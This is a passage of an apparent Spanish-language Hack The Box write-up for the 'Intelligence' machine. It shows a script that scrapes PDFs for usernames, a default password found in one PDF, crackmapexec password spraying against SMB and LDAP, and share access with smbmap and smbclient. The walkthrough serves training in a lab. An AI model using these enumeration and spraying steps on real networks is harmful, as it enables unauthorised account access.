http://intelligence.htb/documents/2020-12-24-upload.pdf
http://intelligence.htb/documents/2020-12-28-upload.pdf
http://intelligence.htb/documents/2020-12-30-upload.pdf &amp;lt;&amp;lt;-------
Finish: &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
http://intelligence.htb/documents/2021-01-03-upload.pdf
http://intelligence.htb/documents/2021-01-14-upload.pdf
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
http://intelligence.htb/documents/2021-03-25-upload.pdf
http://intelligence.htb/documents/2021-03-27-upload.pdf
Finish: &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;
Finish: &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Intentamos utilizar la contrase√±a y usuario (&lt;code&gt;NewIntelligenceCorpUser9876:Ted&lt;/code&gt;) pero en ningun puerto/servicio fue aceptada la combinacion.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# http://intelligence.htb/documents/2020-06-04-upload.pdf&lt;/span&gt;
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible

&lt;span class=&#34;c1&#34;&gt;# http://intelligence.htb/documents/2020-12-30-upload.pdf&lt;/span&gt;
Internal IT Update
There has recently been some outages on our web servers. Ted has gotten a script in place to &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt; notify us &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; this happens again.
Also, after discussion following our recent security audit we are in the processof locking down our service accounts.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;exiftool&#34;&gt;Exiftool&lt;/h2&gt;
&lt;p&gt;Tras ejecutar exiftool a los PDFs vemos posibles nombres de usuarios en los metadatos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;œÄ ~/htb/intelligence/docs ‚ùØ exiftool *
&lt;span class=&#34;o&#34;&gt;========&lt;/span&gt; 2020-06-04-upload.pdf
ExifTool Version Number         : 12.16
File Name                       : 2020-06-04-upload.pdf
Directory                       : .
File Size                       : &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; KiB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2021:07:08 03:17:02-04:00
File Inode Change Date/Time     : 2021:07:08 03:16:59-04:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
Creator                         : Jason.Patterson
&lt;span class=&#34;o&#34;&gt;========&lt;/span&gt; 2020-12-30-upload.pdf
ExifTool Version Number         : 12.16
File Name                       : 2020-12-30-upload.pdf
Directory                       : .
File Size                       : &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; KiB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2021:07:08 03:17:13-04:00
File Inode Change Date/Time     : 2021:07:08 03:17:10-04:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
Creator                         : Jason.Patterson
    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; image files &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt;
 œÄ ~/htb/intelligence/docs ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Con algunas modificaciones en el script y con informacion que encontramos creamos el wordlist &lt;code&gt;users.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/usr/bin/env python3
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;import requests, exiftool, wget, glob, os
&lt;span class=&#34;c1&#34;&gt;# pip3 install PyExifTool&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# pip3 install wget&lt;/span&gt;

def zero&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; str&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; int&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; str&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;+str&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;

def get_usernames&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;files: list&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
    &lt;span class=&#34;nv&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;
    with exiftool.ExifTool&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; as et:
        &lt;span class=&#34;nv&#34;&gt;metadata&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; et.get_metadata_batch&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;files&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; d in metadata:
        user.append&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;d&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PDF:Creator&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;       
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; user

&lt;span class=&#34;c1&#34;&gt;# All .pdf&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; a in range&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2020, 2022&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
    print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;Init: {a}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; b in range&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0,13&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; c in range&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0,32&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:         
            &lt;span class=&#34;nv&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://intelligence.htb/documents/{a}-{zero(b)}-{zero(c)}-upload.pdf&amp;#34;&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; requests.get&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; r.status_code !&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 404:
                wget.download&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;              
    print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;Finish: {a}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;


&lt;span class=&#34;c1&#34;&gt;# All files ending with .pdf to users.txt&lt;/span&gt;
with open&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;users.txt&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; as the_file:
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; i in get_usernames&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;glob.glob&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;os.getcwd&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;+&lt;span class=&#34;s2&#34;&gt;&amp;#34;/*.pdf&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;:
        the_file.write&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;{i}\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al finalizar la ejecucion encontramos 30 &amp;ldquo;nombres y apellidos&amp;rdquo;, utilizamos &lt;code&gt;sort&lt;/code&gt; y &lt;code&gt;uniq&lt;/code&gt; para eliminar los duplicados.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;œÄ ~/htb/intelligence/docs ‚ùØ ./enum_docs.py
Init: &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
100% &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;..............................................................................&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;25109&lt;/span&gt; / 25109Finish: &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
100% &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;..............................................................................&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;12127&lt;/span&gt; / 12127Finish: &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
 œÄ ~/htb/intelligence/docs ‚ùØ cat users.txt&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;sort&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;uniq&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;wc -l
&lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;
 œÄ ~/htb/intelligence/docs ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;tiffany---user&#34;&gt;Tiffany - User&lt;/h1&gt;
&lt;h2 id=&#34;password-spraying&#34;&gt;Password Spraying&lt;/h2&gt;
&lt;p&gt;Utilizamos la contrase√±a junto con el wordlist de usuarios para realizar &lt;a href=&#34;https://mpgn.gitbook.io/crackmapexec/smb-protocol/password-spraying&#34;&gt;Password Spraying&lt;/a&gt;. Logramos encontrar una combinacion de usuario:contrase√±a aceptada en Samba y Ldap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/intelligence/docs ‚ùØ crackmapexec smb intelligence.htb -u usersV2.txt -p NewIntelligenceCorpUser9876&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep +
SMB         10.10.10.248    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DC               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; intelligence.htb&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina:NewIntelligenceCorpUser9876
 œÄ ~/htb/intelligence/docs ‚ùØ crackmapexec ldap intelligence.htb -u usersV2.txt -p NewIntelligenceCorpUser9876&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep +
LDAP        10.10.10.248    &lt;span class=&#34;m&#34;&gt;389&lt;/span&gt;    DC               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; intelligence.htb&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina:NewIntelligenceCorpUser9876
 œÄ ~/htb/intelligence/docs ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;smb&#34;&gt;SMB&lt;/h2&gt;
&lt;p&gt;Tras enumerar los recursos en SAMBA vemos que sobresaltan &lt;code&gt;Users&lt;/code&gt; y &lt;code&gt;IT&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/intelligence ‚ùØ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H intelligence.htb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; IP: intelligence.htb:445    Name: unknown
    Disk                                                    Permissions Comment
    ----                                                    ----------- -------
    ADMIN$                                              NO ACCESS   Remote Admin
    C$                                                  NO ACCESS   Default share
    IPC$                                                READ ONLY   Remote IPC
    IT                                                  READ ONLY   
    NETLOGON                                            READ ONLY   Logon server share
    SYSVOL                                              READ ONLY   Logon server share
    Users                                               READ ONLY   
 œÄ ~/htb/intelligence ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ingresamos al recurso &lt;code&gt;Users&lt;/code&gt; donde encontramos la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/intelligence ‚ùØ smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;intelligence.htb&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Users -U Tiffany.Molina &lt;span class=&#34;c1&#34;&gt;# NewIntelligenceCorpUser9876&lt;/span&gt;
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password:
Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                  DR        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 21:20:26 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  ..                                 DR        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 21:20:26 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  Administrator                       D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:18:39 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  All Users                       DHSrn        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sat Sep &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 03:21:46 &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt;
  Default                           DHR        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 22:17:40 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
  Default User                    DHSrn        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sat Sep &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 03:21:46 &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt;
  desktop.ini                       AHS      &lt;span class=&#34;m&#34;&gt;174&lt;/span&gt;  Sat Sep &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 03:11:27 &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt;
  Public                             DR        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Apr &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:18:39 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
